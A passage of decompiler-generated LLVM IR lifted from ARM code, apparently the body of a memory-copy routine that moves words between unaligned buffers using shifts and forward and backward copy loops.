  %v2_15c1c = inttoptr i32 %v1_15c1c to i32*
  store i32 %v5_15c18, i32* %v2_15c1c, align 4
  %v3_15c1c = load i32, i32* %r0.global-to-local, align 4
  %v4_15c1c = add i32 %v3_15c1c, 4
  store i32 %v4_15c1c, i32* %r0.global-to-local, align 4
  %v0_15c20 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c20 = add i32 %v0_15c20, -4
  store i32 %v2_15c20, i32* %r2.global-to-local, align 4
  %v6_15c24 = icmp slt i32 %v0_15c20, 4
  br i1 %v6_15c24, label %dec_label_pc_15c28.loopexit, label %dec_label_pc_15c10

dec_label_pc_15c28.loopexit:                      ; preds = %dec_label_pc_15c10
  %v4_15c20 = sub i32 3, %v0_15c20
  %v5_15c20 = and i32 %v4_15c20, %v0_15c20
  %v6_15c20 = icmp slt i32 %v5_15c20, 0
  %v7_15c20 = icmp slt i32 %v2_15c20, 0
  store i1 %v6_15c20, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c20, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15c28

dec_label_pc_15c28:                               ; preds = %dec_label_pc_15c28.loopexit, %dec_label_pc_15c04
  %v2_15afc112 = phi i32 [ %v4_15c1c, %dec_label_pc_15c28.loopexit ], [ %v12_15bf8, %dec_label_pc_15c04 ]
  %v0_15aec108 = phi i32 [ %v2_15c20, %dec_label_pc_15c28.loopexit ], [ %v2_15c08, %dec_label_pc_15c04 ]
  %v0_15c28 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c28 = add i32 %v0_15c28, -2
  store i32 %v1_15c28, i32* @r1, align 4
  br label %bb133

dec_label_pc_15c30:                               ; preds = %dec_label_pc_15b44
  br i1 %v5_15c34, label %dec_label_pc_15c7c, label %dec_label_pc_15c38

dec_label_pc_15c38:                               ; preds = %dec_label_pc_15c30
  store i32 %v2_15c30, i32* %r2.global-to-local, align 4
  %v3_15c3c = load i32, i32* @r4, align 4
  store i32 %v3_15c3c, i32* %stack_var_-16, align 4
  %v6_15c3c = load i32, i32* @r5, align 4
  store i32 %v6_15c3c, i32* %stack_var_-12, align 4
  br label %dec_label_pc_15c40

dec_label_pc_15c40:                               ; preds = %dec_label_pc_15c40.dec_label_pc_15c40_crit_edge, %dec_label_pc_15c38
  %v0_15c64 = phi i32 [ %v12_15c64, %dec_label_pc_15c40.dec_label_pc_15c40_crit_edge ], [ %v0_15b8c75, %dec_label_pc_15c38 ]
  %v0_15c44 = phi i32 [ %v0_15c44.pre, %dec_label_pc_15c40.dec_label_pc_15c40_crit_edge ], [ %v4_15b48, %dec_label_pc_15c38 ]
  %v0_15c40 = phi i32 [ %v0_15c40.pre, %dec_label_pc_15c40.dec_label_pc_15c40_crit_edge ], [ %v2_15b48, %dec_label_pc_15c38 ]
  %v3_15c40 = udiv i32 %v0_15c40, 16777216
  store i32 %v3_15c40, i32* %r3.global-to-local, align 4
  %v1_15c44 = inttoptr i32 %v0_15c44 to i32*
  %v2_15c44 = load i32, i32* %v1_15c44, align 4
  store i32 %v2_15c44, i32* %r4.global-to-local, align 4
  %v3_15c44 = add i32 %v0_15c44, 4
  %v4_15c44 = inttoptr i32 %v3_15c44 to i32*
  %v5_15c44 = load i32, i32* %v4_15c44, align 4
  store i32 %v5_15c44, i32* %r5.global-to-local, align 4
  %v6_15c44 = add i32 %v0_15c44, 8
  %v7_15c44 = inttoptr i32 %v6_15c44 to i32*
  %v8_15c44 = load i32, i32* %v7_15c44, align 4
  store i32 %v8_15c44, i32* %ip.global-to-local, align 4
  %v9_15c44 = add i32 %v0_15c44, 12
  %v10_15c44 = inttoptr i32 %v9_15c44 to i32*
  %v11_15c44 = load i32, i32* %v10_15c44, align 4
  store i32 %v11_15c44, i32* @lr, align 4
  %v12_15c44 = add i32 %v0_15c44, 16
  store i32 %v12_15c44, i32* %r1.global-to-local, align 4
  %v4_15c48 = mul i32 %v2_15c44, 256
  %v5_15c48 = or i32 %v4_15c48, %v3_15c40
  store i32 %v5_15c48, i32* %r3.global-to-local, align 4
  %v3_15c4c = udiv i32 %v2_15c44, 16777216
  %v4_15c50 = mul i32 %v5_15c44, 256
  %v5_15c50 = or i32 %v4_15c50, %v3_15c4c
  store i32 %v5_15c50, i32* %r4.global-to-local, align 4
  %v3_15c54 = udiv i32 %v5_15c44, 16777216
  %v4_15c58 = mul i32 %v8_15c44, 256
  %v5_15c58 = or i32 %v4_15c58, %v3_15c54
  store i32 %v5_15c58, i32* %r5.global-to-local, align 4
  %v3_15c5c = udiv i32 %v8_15c44, 16777216
  %v4_15c60 = mul i32 %v11_15c44, 256
  %v5_15c60 = or i32 %v4_15c60, %v3_15c5c
  store i32 %v5_15c60, i32* %ip.global-to-local, align 4
  %v1_15c64 = inttoptr i32 %v0_15c64 to i32*
  store i32 %v5_15c48, i32* %v1_15c64, align 4
  %v3_15c64 = add i32 %v0_15c64, 4
  %v4_15c64 = inttoptr i32 %v3_15c64 to i32*
  %v5_15c64 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15c64, i32* %v4_15c64, align 4
  %v6_15c64 = add i32 %v0_15c64, 8
  %v7_15c64 = inttoptr i32 %v6_15c64 to i32*
  %v8_15c64 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15c64, i32* %v7_15c64, align 4
  %v9_15c64 = add i32 %v0_15c64, 12
  %v10_15c64 = inttoptr i32 %v9_15c64 to i32*
  %v11_15c64 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v11_15c64, i32* %v10_15c64, align 4
  %v12_15c64 = add i32 %v0_15c64, 16
  store i32 %v12_15c64, i32* %r0.global-to-local, align 4
  %v0_15c68 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c68 = add i32 %v0_15c68, -16
  store i32 %v2_15c68, i32* %r2.global-to-local, align 4
  %v6_15c6c = icmp slt i32 %v0_15c68, 16
  br i1 %v6_15c6c, label %dec_label_pc_15c70, label %dec_label_pc_15c40.dec_label_pc_15c40_crit_edge

dec_label_pc_15c40.dec_label_pc_15c40_crit_edge:  ; preds = %dec_label_pc_15c40
  %v0_15c40.pre = load i32, i32* @lr, align 4
  %v0_15c44.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15c40

dec_label_pc_15c70:                               ; preds = %dec_label_pc_15c40
  %v2_15c70 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_15c70, i32* @r4, align 4
  %v5_15c70 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_15c70, i32* @r5, align 4
  %v2_15c74 = add i32 %v0_15c68, -4
  store i32 %v2_15c74, i32* %r2.global-to-local, align 4
  %v4_15c74 = add i32 %v0_15c68, 2147483632
  %v5_15c74 = and i32 %v2_15c74, %v4_15c74
  %v6_15c74 = icmp slt i32 %v5_15c74, 0
  store i1 %v6_15c74, i1* %cpsr_v.global-to-local, align 1
  %v7_15c74 = icmp slt i32 %v2_15c74, 0
  store i1 %v7_15c74, i1* %cpsr_n.global-to-local, align 1
  %v5_15c78 = icmp slt i32 %v2_15c68, -12
  br i1 %v5_15c78, label %dec_label_pc_15c94, label %dec_label_pc_15c7c

dec_label_pc_15c7c:                               ; preds = %dec_label_pc_15c70, %dec_label_pc_15c30, %dec_label_pc_15c7c
  %v1_15c88 = phi i32 [ %v4_15c88, %dec_label_pc_15c7c ], [ %v12_15c64, %dec_label_pc_15c70 ], [ %v0_15b8c75, %dec_label_pc_15c30 ]
  %v0_15c7c = load i32, i32* @lr, align 4
  %v3_15c7c = udiv i32 %v0_15c7c, 16777216
  store i32 %v3_15c7c, i32* %ip.global-to-local, align 4
  %v0_15c80 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c80 = inttoptr i32 %v0_15c80 to i32*
  %v2_15c80 = load i32, i32* %v1_15c80, align 4
  store i32 %v2_15c80, i32* @lr, align 4
  %v4_15c80 = add i32 %v0_15c80, 4
  store i32 %v4_15c80, i32* %r1.global-to-local, align 4
  %v4_15c84 = mul i32 %v2_15c80, 256
  %v5_15c84 = or i32 %v4_15c84, %v3_15c7c
  store i32 %v5_15c84, i32* %ip.global-to-local, align 4
  %v2_15c88 = inttoptr i32 %v1_15c88 to i32*
  store i32 %v5_15c84, i32* %v2_15c88, align 4
  %v3_15c88 = load i32, i32* %r0.global-to-local, align 4
  %v4_15c88 = add i32 %v3_15c88, 4
  store i32 %v4_15c88, i32* %r0.global-to-local, align 4
  %v0_15c8c = load i32, i32* %r2.global-to-local, align 4
  %v2_15c8c = add i32 %v0_15c8c, -4
  store i32 %v2_15c8c, i32* %r2.global-to-local, align 4
  %v6_15c90 = icmp slt i32 %v0_15c8c, 4
  br i1 %v6_15c90, label %dec_label_pc_15c94.loopexit, label %dec_label_pc_15c7c

dec_label_pc_15c94.loopexit:                      ; preds = %dec_label_pc_15c7c
  %v4_15c8c = sub i32 3, %v0_15c8c
  %v5_15c8c = and i32 %v4_15c8c, %v0_15c8c
  %v6_15c8c = icmp slt i32 %v5_15c8c, 0
  %v7_15c8c = icmp slt i32 %v2_15c8c, 0
  store i1 %v6_15c8c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15c8c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15c94

dec_label_pc_15c94:                               ; preds = %dec_label_pc_15c94.loopexit, %dec_label_pc_15c70
  %v2_15afc113 = phi i32 [ %v4_15c88, %dec_label_pc_15c94.loopexit ], [ %v12_15c64, %dec_label_pc_15c70 ]
  %v0_15aec109 = phi i32 [ %v2_15c8c, %dec_label_pc_15c94.loopexit ], [ %v2_15c74, %dec_label_pc_15c70 ]
  %v0_15c94 = load i32, i32* %r1.global-to-local, align 4
  %v1_15c94 = add i32 %v0_15c94, -1
  store i32 %v1_15c94, i32* @r1, align 4
  br label %bb133

dec_label_pc_15c9c:                               ; preds = %entry
  %v1_15c9c = load i32, i32* @r2, align 4
  %v2_15c9c = add i32 %v1_15c9c, %v0_15a50
  store i32 %v2_15c9c, i32* @r1, align 4
  %v2_15ca0 = add i32 %v1_15c9c, %v1_15a50
  store i32 %v2_15ca0, i32* %r0.global-to-local, align 4
  %v2_15ca4 = add i32 %v1_15c9c, -4
  store i32 %v2_15ca4, i32* %r2.global-to-local, align 4
  %v4_15ca4 = sub i32 3, %v1_15c9c
  %v5_15ca4 = and i32 %v4_15ca4, %v1_15c9c
  %v6_15ca4 = icmp slt i32 %v5_15ca4, 0
  store i1 %v6_15ca4, i1* %cpsr_v.global-to-local, align 1
  %v7_15ca4 = icmp slt i32 %v2_15ca4, 0
  store i1 %v7_15ca4, i1* %cpsr_n.global-to-local, align 1
  %v5_15ca8 = icmp slt i32 %v1_15c9c, 4
  br i1 %v5_15ca8, label %bb143, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15c9c
  %v1_15cac = urem i32 %v2_15ca0, 4
  store i32 %v1_15cac, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15cac = icmp eq i32 %v1_15cac, 0
  br i1 %v2_15cac, label %dec_label_pc_15cb4, label %dec_label_pc_15d54

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15cac
  %v1_15cb4 = urem i32 %v2_15c9c, 4
  store i32 %v1_15cb4, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_15cb4 = icmp eq i32 %v1_15cb4, 0
  br i1 %v2_15cb4, label %dec_label_pc_15cbc, label %dec_label_pc_15d80

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15d78
  %v0_15cd449 = phi i32 [ %v2_15ca0, %dec_label_pc_15cb4 ], [ %v0_15dc832, %dec_label_pc_15d78 ]
  %v0_15cd048 = phi i32 [ %v2_15c9c, %dec_label_pc_15cb4 ], [ %v0_15d78, %dec_label_pc_15d78 ]
  %v0_15cbc = phi i32 [ %v2_15ca4, %dec_label_pc_15cb4 ], [ %v2_15d70, %dec_label_pc_15d78 ]
  %v2_15cbc = add i32 %v0_15cbc, -8
  store i32 %v2_15cbc, i32* %r2.global-to-local, align 4
  %v4_15cbc = sub i32 7, %v0_15cbc
  %v5_15cbc = and i32 %v4_15cbc, %v0_15cbc
  %v6_15cbc = icmp slt i32 %v5_15cbc, 0
  store i1 %v6_15cbc, i1* %cpsr_v.global-to-local, align 1
  %v7_15cbc = icmp slt i32 %v2_15cbc, 0
  store i1 %v7_15cbc, i1* %cpsr_n.global-to-local, align 1
  %v5_15cc0 = icmp slt i32 %v0_15cbc, 8
  br i1 %v5_15cc0, label %dec_label_pc_15d0c, label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cbc
  %v3_15cc4 = load i32, i32* @r4, align 4
  %v5_15cc4 = inttoptr i32 %v3_15cc4 to i8*
  store i8* %v5_15cc4, i8** %stack_var_-8, align 4
  %v8_15cc4 = load i32, i32* @lr, align 4
  %v2_15cc8 = add i32 %v0_15cbc, -28
  store i32 %v2_15cc8, i32* %r2.global-to-local, align 4
  %v4_15cc8 = sub i32 27, %v0_15cbc
  %v5_15cc8 = and i32 %v4_15cc8, %v2_15cbc
  %v6_15cc8 = icmp slt i32 %v5_15cc8, 0
  store i1 %v6_15cc8, i1* %cpsr_v.global-to-local, align 1
  %v7_15cc8 = icmp slt i32 %v2_15cc8, 0
  store i1 %v7_15cc8, i1* %cpsr_n.global-to-local, align 1
  %v5_15ccc = icmp slt i32 %v2_15cbc, 20
  br i1 %v5_15ccc, label %dec_label_pc_15ce8, label %dec_label_pc_15cd0

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cc4, %dec_label_pc_15cd0.dec_label_pc_15cd0_crit_edge
  %v0_15cd4 = phi i32 [ %v1_15cdc, %dec_label_pc_15cd0.dec_label_pc_15cd0_crit_edge ], [ %v0_15cd449, %dec_label_pc_15cc4 ]
  %v0_15cd0 = phi i32 [ %v0_15cd0.pre, %dec_label_pc_15cd0.dec_label_pc_15cd0_crit_edge ], [ %v0_15cd048, %dec_label_pc_15cc4 ]
  %v1_15cd0 = add i32 %v0_15cd0, -4
  %v2_15cd0 = inttoptr i32 %v1_15cd0 to i32*
  %v3_15cd0 = load i32, i32* %v2_15cd0, align 4
  store i32 %v3_15cd0, i32* %r3.global-to-local, align 4
  %v4_15cd0 = add i32 %v0_15cd0, -8
  %v5_15cd0 = inttoptr i32 %v4_15cd0 to i32*
  %v6_15cd0 = load i32, i32* %v5_15cd0, align 4
  store i32 %v6_15cd0, i32* %r4.global-to-local, align 4
  %v7_15cd0 = add i32 %v0_15cd0, -12
  %v8_15cd0 = inttoptr i32 %v7_15cd0 to i32*
  %v9_15cd0 = load i32, i32* %v8_15cd0, align 4
  store i32 %v9_15cd0, i32* %ip.global-to-local, align 4
  %v10_15cd0 = add i32 %v0_15cd0, -16
  %v11_15cd0 = inttoptr i32 %v10_15cd0 to i32*
  %v12_15cd0 = load i32, i32* %v11_15cd0, align 4
  store i32 %v12_15cd0, i32* %lr.global-to-local, align 4
  store i32 %v10_15cd0, i32* %r1.global-to-local, align 4
  %v1_15cd4 = add i32 %v0_15cd4, -16
  %v2_15cd4 = inttoptr i32 %v1_15cd4 to i32*
  store i32 %v3_15cd0, i32* %v2_15cd4, align 4
  %v4_15cd4 = add i32 %v0_15cd4, -12
  %v5_15cd4 = inttoptr i32 %v4_15cd4 to i32*
  %v6_15cd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15cd4, i32* %v5_15cd4, align 4
  %v7_15cd4 = add i32 %v0_15cd4, -8
  %v8_15cd4 = inttoptr i32 %v7_15cd4 to i32*
  %v9_15cd4 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15cd4, i32* %v8_15cd4, align 4
  %v10_15cd4 = add i32 %v0_15cd4, -4
  %v11_15cd4 = inttoptr i32 %v10_15cd4 to i32*
  %v12_15cd4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15cd4, i32* %v11_15cd4, align 4
  store i32 %v1_15cd4, i32* %r0.global-to-local, align 4
  %v0_15cd8 = load i32, i32* %r1.global-to-local, align 4
  %v1_15cd8 = add i32 %v0_15cd8, -4
  %v2_15cd8 = inttoptr i32 %v1_15cd8 to i32*
  %v3_15cd8 = load i32, i32* %v2_15cd8, align 4
  store i32 %v3_15cd8, i32* %r3.global-to-local, align 4
  %v4_15cd8 = add i32 %v0_15cd8, -8
  %v5_15cd8 = inttoptr i32 %v4_15cd8 to i32*
  %v6_15cd8 = load i32, i32* %v5_15cd8, align 4
  store i32 %v6_15cd8, i32* %r4.global-to-local, align 4
  %v7_15cd8 = add i32 %v0_15cd8, -12
  %v8_15cd8 = inttoptr i32 %v7_15cd8 to i32*
  %v9_15cd8 = load i32, i32* %v8_15cd8, align 4
  store i32 %v9_15cd8, i32* %ip.global-to-local, align 4
  %v10_15cd8 = add i32 %v0_15cd8, -16
  %v11_15cd8 = inttoptr i32 %v10_15cd8 to i32*
  %v12_15cd8 = load i32, i32* %v11_15cd8, align 4
  store i32 %v12_15cd8, i32* %lr.global-to-local, align 4
  store i32 %v10_15cd8, i32* @r1, align 4
  %v1_15cdc = add i32 %v0_15cd4, -32
  %v2_15cdc = inttoptr i32 %v1_15cdc to i32*
  store i32 %v3_15cd8, i32* %v2_15cdc, align 4
  %v4_15cdc = add i32 %v0_15cd4, -28
  %v5_15cdc = inttoptr i32 %v4_15cdc to i32*
  %v6_15cdc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_15cdc, i32* %v5_15cdc, align 4
  %v7_15cdc = add i32 %v0_15cd4, -24
  %v8_15cdc = inttoptr i32 %v7_15cdc to i32*
  %v9_15cdc = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_15cdc, i32* %v8_15cdc, align 4
  %v10_15cdc = add i32 %v0_15cd4, -20
  %v11_15cdc = inttoptr i32 %v10_15cdc to i32*
  %v12_15cdc = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_15cdc, i32* %v11_15cdc, align 4
  store i32 %v1_15cdc, i32* %r0.global-to-local, align 4
  %v0_15ce0 = load i32, i32* %r2.global-to-local, align 4
  %v2_15ce0 = add i32 %v0_15ce0, -32
  store i32 %v2_15ce0, i32* %r2.global-to-local, align 4
  %v6_15ce4 = icmp slt i32 %v0_15ce0, 32
  br i1 %v6_15ce4, label %dec_label_pc_15ce8.loopexit, label %dec_label_pc_15cd0.dec_label_pc_15cd0_crit_edge

dec_label_pc_15cd0.dec_label_pc_15cd0_crit_edge:  ; preds = %dec_label_pc_15cd0
  %v0_15cd0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_15cd0

dec_label_pc_15ce8.loopexit:                      ; preds = %dec_label_pc_15cd0
  %v4_15ce0 = sub i32 31, %v0_15ce0
  %v5_15ce0 = and i32 %v4_15ce0, %v0_15ce0
  %v6_15ce0 = icmp slt i32 %v5_15ce0, 0
  %v7_15ce0 = icmp slt i32 %v2_15ce0, 0
  store i1 %v6_15ce0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_15ce0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15ce8.loopexit, %dec_label_pc_15cc4
  %v6_15cf0 = phi i32 [ %v1_15cdc, %dec_label_pc_15ce8.loopexit ], [ %v0_15cd449, %dec_label_pc_15cc4 ]
  %v0_15cf8.pr = phi i32 [ %v2_15ce0, %dec_label_pc_15ce8.loopexit ], [ %v2_15cc8, %dec_label_pc_15cc4 ]
  %v4_15ce8 = add i32 %v0_15cf8.pr, 16
  %v6_15ce8 = sub i32 0, %v0_15cf8.pr
  %v7_15ce8 = and i32 %v4_15ce8, %v6_15ce8
  %v8_15ce8 = icmp slt i32 %v7_15ce8, 0
  store i1 %v8_15ce8, i1* %cpsr_v.global-to-local, align 1
  %v9_15ce8 = icmp slt i32 %v4_15ce8, 0
  store i1 %v9_15ce8, i1* %cpsr_n.global-to-local, align 1
  %v5_15cec = icmp slt i32 %v0_15cf8.pr, -16
  br i1 %v5_15cec, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_15ce8
  %v6_15cec = load i32, i32* @r1, align 4
  %v7_15cec = add i32 %v6_15cec, -4
  %v8_15cec = inttoptr i32 %v7_15cec to i32*
  %v9_15cec = load i32, i32* %v8_15cec, align 4
  store i32 %v9_15cec, i32* %r3.global-to-local, align 4
  %v10_15cec = add i32 %v6_15cec, -8
  %v11_15cec = inttoptr i32 %v10_15cec to i32*
  %v12_15cec = load i32, i32* %v11_15cec, align 4
  store i32 %v12_15cec, i32* %r4.global-to-local, align 4
  %v13_15cec = add i32 %v6_15cec, -12
  %v14_15cec = inttoptr i32 %v13_15cec to i32*
  %v15_15cec = load i32, i32* %v14_15cec, align 4
  store i32 %v15_15cec, i32* %ip.global-to-local, align 4
  %v16_15cec = add i32 %v6_15cec, -16
  %v17_15cec = inttoptr i32 %v16_15cec to i32*
  %v18_15cec = load i32, i32* %v17_15cec, align 4
  store i32 %v18_15cec, i32* %lr.global-to-local, align 4
  store i32 %v16_15cec, i32* @r1, align 4
  %v7_15cf0 = add i32 %v6_15cf0, -16
  %v8_15cf0 = inttoptr i32 %v7_15cf0 to i32*
  store i32 %v9_15cec, i32* %v8_15cf0, align 4
  %v10_15cf0 = add i32 %v6_15cf0, -12
  %v11_15cf0 = inttoptr i32 %v10_15cf0 to i32*
  %v12_15cf0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_15cf0, i32* %v11_15cf0, align 4
  %v13_15cf0 = add i32 %v6_15cf0, -8
  %v14_15cf0 = inttoptr i32 %v13_15cf0 to i32*
  %v15_15cf0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v15_15cf0, i32* %v14_15cf0, align 4
  %v16_15cf0 = add i32 %v6_15cf0, -4
  %v17_15cf0 = inttoptr i32 %v16_15cf0 to i32*
  %v18_15cf0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_15cf0, i32* %v17_15cf0, align 4
  store i32 %v7_15cf0, i32* %r0.global-to-local, align 4
  %v6_15cf4 = load i32, i32* %r2.global-to-local, align 4
  %v7_15cf4 = add i32 %v6_15cf4, -16
  store i32 %v7_15cf4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15ce8, %bb140
  %v6_15d00 = phi i32 [ %v7_15cf0, %bb140 ], [ %v6_15cf0, %dec_label_pc_15ce8 ]
  %v0_15cf8 = phi i32 [ %v7_15cf4, %bb140 ], [ %v0_15cf8.pr, %dec_label_pc_15ce8 ]
  %v4_15cf8 = add i32 %v0_15cf8, 20
  store i32 %v4_15cf8, i32* %r2.global-to-local, align 4
  %v6_15cf8 = sub i32 0, %v0_15cf8
  %v7_15cf8 = and i32 %v4_15cf8, %v6_15cf8
  %v8_15cf8 = icmp slt i32 %v7_15cf8, 0
  store i1 %v8_15cf8, i1* %cpsr_v.global-to-local, align 1
  %v9_15cf8 = icmp slt i32 %v4_15cf8, 0
  store i1 %v9_15cf8, i1* %cpsr_n.global-to-local, align 1
  %v5_15cfc = icmp slt i32 %v0_15cf8, -20
  br i1 %v5_15cfc, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_15cfc = load i32, i32* @r1, align 4
  %v7_15cfc = add i32 %v6_15cfc, -4
  %v8_15cfc = inttoptr i32 %v7_15cfc to i32*
  %v9_15cfc = load i32, i32* %v8_15cfc, align 4
  store i32 %v9_15cfc, i32* %r3.global-to-local, align 4
  %v10_15cfc = add i32 %v6_15cfc, -8
  %v11_15cfc = inttoptr i32 %v10_15cfc to i32*
  %v12_15cfc = load i32, i32* %v11_15cfc, align 4
  store i32 %v12_15cfc, i32* %ip.global-to-local, align 4
  %v13_15cfc = add i32 %v6_15cfc, -12
  %v14_15cfc = inttoptr i32 %v13_15cfc to i32*
  %v15_15cfc = load i32, i32* %v14_15cfc, align 4
  store i32 %v15_15cfc, i32* %lr.global-to-local, align 4
  store i32 %v13_15cfc, i32* @r1, align 4
  %v7_15d00 = add i32 %v6_15d00, -12
  %v8_15d00 = inttoptr i32 %v7_15d00 to i32*
  store i32 %v9_15cfc, i32* %v8_15d00, align 4
  %v10_15d00 = add i32 %v6_15d00, -8
  %v11_15d00 = inttoptr i32 %v10_15d00 to i32*
  %v12_15d00 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_15d00, i32* %v11_15d00, align 4
  %v13_15d00 = add i32 %v6_15d00, -4
  %v14_15d00 = inttoptr i32 %v13_15d00 to i32*
  %v15_15d00 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_15d00, i32* %v14_15d00, align 4
  store i32 %v7_15d00, i32* %r0.global-to-local, align 4
  %v6_15d04 = load i32, i32* %r2.global-to-local, align 4
  %v7_15d04 = add i32 %v6_15d04, -12
  store i32 %v7_15d04, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_15d2457 = phi i32 [ %v6_15d00, %.thread14 ], [ %v7_15d00, %bb141 ]
  %v0_15d0c55 = phi i32 [ %v4_15cf8, %.thread14 ], [ %v7_15d04, %bb141 ]
  %v2_15d08 = load i8*, i8** %stack_var_-8, align 4
  %v3_15d08 = ptrtoint i8* %v2_15d08 to i32
  store i32 %v3_15d08, i32* @r4, align 4
  store i32 %v8_15cc4, i32* @lr, align 4
  br label %dec_label_pc_15d0c

dec_label_pc_15d0c:                               ; preds = %dec_label_pc_15cbc, %.thread16
  %v7_15d1c = phi i32 [ %v0_15cd449, %dec_label_pc_15cbc ], [ %v6_15d2457, %.thread16 ]
  %v0_15d0c = phi i32 [ %v2_15cbc, %dec_label_pc_15cbc ], [ %v0_15d0c55, %.thread16 ]
  %v2_15d0c = add i32 %v0_15d0c, 8
  store i32 %v2_15d0c, i32* %r2.global-to-local, align 4
  %v4_15d0c = sub i32 0, %v0_15d0c
  %v5_15d0c = and i32 %v2_15d0c, %v4_15d0c
  %v6_15d0c = icmp slt i32 %v5_15d0c, 0
  store i1 %v6_15d0c, i1* %cpsr_v.global-to-local, align 1
  %v7_15d0c = icmp slt i32 %v2_15d0c, 0
  store i1 %v7_15d0c, i1* %cpsr_n.global-to-local, align 1
  %v5_15d10 = icmp slt i32 %v0_15d0c, -8
  br i1 %v5_15d10, label %bb143, label %dec_label_pc_15d14

dec_label_pc_15d14:                               ; preds = %dec_label_pc_15d0c
  %v6_15d14 = add i32 %v0_15d0c, 4
  store i32 %v6_15d14, i32* %r2.global-to-local, align 4
  %v8_15d14 = sub i32 -5, %v0_15d0c
  %v9_15d14 = and i32 %v8_15d14, %v2_15d0c
  %v10_15d14 = icmp slt i32 %v9_15d14, 0
  store i1 %v10_15d14, i1* %cpsr_v.global-to-local, align 1
  %v11_15d14 = icmp slt i32 %v6_15d14, 0
  store i1 %v11_15d14, i1* %cpsr_n.global-to-local, align 1
  %v5_15d18 = icmp slt i32 %v2_15d0c, 4
  %v6_15d18 = load i32, i32* @r1, align 4
  %v7_15d18 = add i32 %v6_15d18, -4
  %v8_15d18 = inttoptr i32 %v7_15d18 to i32*
  %v9_15d18 = load i32, i32* %v8_15d18, align 4
  store i32 %v9_15d18, i32* %r3.global-to-local, align 4
  br i1 %v5_15d18, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_15d14
  store i32 %v7_15d18, i32* @r1, align 4
  %v8_15d1c = add i32 %v7_15d1c, -4
  %v9_15d1c = inttoptr i32 %v8_15d1c to i32*
  store i32 %v9_15d18, i32* %v9_15d1c, align 4
  %v10_15d1c = load i32, i32* %r0.global-to-local, align 4
  %v11_15d1c = add i32 %v10_15d1c, -4
  store i32 %v11_15d1c, i32* %r0.global-to-local, align 4
  %v0_15d2c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_15d14
  %v10_15d20 = add i32 %v6_15d18, -8
  %v11_15d20 = inttoptr i32 %v10_15d20 to i32*
  %v12_15d20 = load i32, i32* %v11_15d20, align 4
  store i32 %v12_15d20, i32* %ip.global-to-local, align 4
  store i32 %v10_15d20, i32* @r1, align 4
  %v7_15d24 = add i32 %v7_15d1c, -8
  %v8_15d24 = inttoptr i32 %v7_15d24 to i32*
  store i32 %v9_15d18, i32* %v8_15d24, align 4
  %v10_15d24 = add i32 %v7_15d1c, -4
  %v11_15d24 = inttoptr i32 %v10_15d24 to i32*
  %v12_15d24 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v12_15d24, i32* %v11_15d24, align 4
  store i32 %v7_15d24, i32* %r0.global-to-local, align 4
  %v6_15d28 = load i32, i32* %r2.global-to-local, align 4
  %v7_15d28 = add i32 %v6_15d28, -4
  store i32 %v7_15d28, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_15d0c, %dec_label_pc_15c9c, %dec_label_pc_15ed0, %dec_label_pc_15e64, %dec_label_pc_15df8, %bb142
  %v2_15d30 = phi i32 [ %v11_15d1c, %.thread20 ], [ %v0_15dc832, %.thread26 ], [ %v7_15d1c, %dec_label_pc_15d0c ], [ %v2_15ca0, %dec_label_pc_15c9c ], [ %v2_15d3c65, %dec_label_pc_15ed0 ], [ %v2_15d3c64, %dec_label_pc_15e64 ], [ %v2_15d3c63, %dec_label_pc_15df8 ], [ %v7_15d24, %bb142 ]
